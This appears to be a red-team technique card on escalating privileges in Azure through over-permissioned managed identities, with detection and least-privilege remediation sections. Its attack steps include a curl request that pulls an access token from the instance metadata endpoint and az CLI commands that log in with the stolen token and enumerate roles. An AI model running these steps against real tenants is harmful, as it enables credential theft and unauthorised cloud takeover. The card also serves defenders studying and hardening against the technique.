# [PE-VALID-011]: Managed Identity MSI Escalation

## Metadata
| Attribute | Details |
|---|---|
| **Technique ID** | PE-VALID-011 |
| **MITRE ATT&CK v18.1** | [Valid Accounts: Cloud Accounts (T1078.004)](https://attack.mitre.org/techniques/T1078/004/) |
| **Tactic** | Privilege Escalation |
| **Platforms** | Entra ID / Azure |
| **Severity** | **High** |
| **Author** | SERVTEP (Pchelnikau Artur) |

## 2. EXECUTIVE SUMMARY
- **Concept:** Azure resources (like VMs, Function Apps, Logic Apps) can be assigned a **System-Assigned Managed Identity**. Sometimes, these identities are granted overly permissive roles (e.g., `Contributor` on the Subscription or `Owner` on a Resource Group) by developers to simplify permissions. If an attacker gains Code Execution on the resource (e.g., via web shell on a VM or deploying code to a Function App), they can request an access token for this identity from the local metadata endpoint (IMDS) and use it to manage Azure resources, effectively inheriting the permissions of the resource.
- **Attack Surface:** Azure Compute Resources (VM, App Service, Automation Account).
- **Business Impact:** **Resource-to-Subscription Escalation**. Moving from a compromised web server to full cloud control.

## 3. PREREQUISITES & CONFIGURATION
- **Required Privileges:** RCE on the Azure Resource (e.g., `www-data` on IIS).
- **Tools:** `curl`, `PowerShell`, Azure CLI

## 4. ATTACK (Red Team Operations)

#### 4.1 Usage
**Step 1: Request Token**
From within the compromised resource:
```bash
# Get Access Token for Azure Management API
curl "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" -H "Metadata: true"
```

**Step 2: Enumerate Permissions**
Use the token to check what the identity can do.
```bash
az login --service-principal -u <ClientID> -p <Token> --tenant <TenantID>
az role assignment list --assignee <ClientID> --all
```

**Step 3: Escalate**
If the identity has `Contributor` rights, use it to add your own user as `Owner` (if `roleAssignments/write` exists) or reset passwords of other VMs.

## 5. DETECTION (Blue Team Operations)

#### 5.1 Entra ID Logs
| Source | Event | Filter Logic |
|---|---|---|
| **SignInLogs** | `ManagedIdentity` | Sign-ins from Managed Identities performing sensitive actions (e.g., Role Assignment) or accessing unexpected resources. |

## 6. DEFENSE & REMEDIATION (Hardening)

#### 6.2 Immediate Remediation
*   **Least Privilege:** Audit all Managed Identities. Ensure they only have permissions required for their specific function (e.g., `Storage Blob Data Contributor`, not `Contributor` on the whole subscription).
*   **User-Assigned:** Prefer User-Assigned Identities for shared permissions, but apply the same strict scoping.

## 7. ATTACK CHAIN
> **Preceding Technique:** [IA-CLOUD-003]
> **Next Logical Step:** [PE-VALID-012]
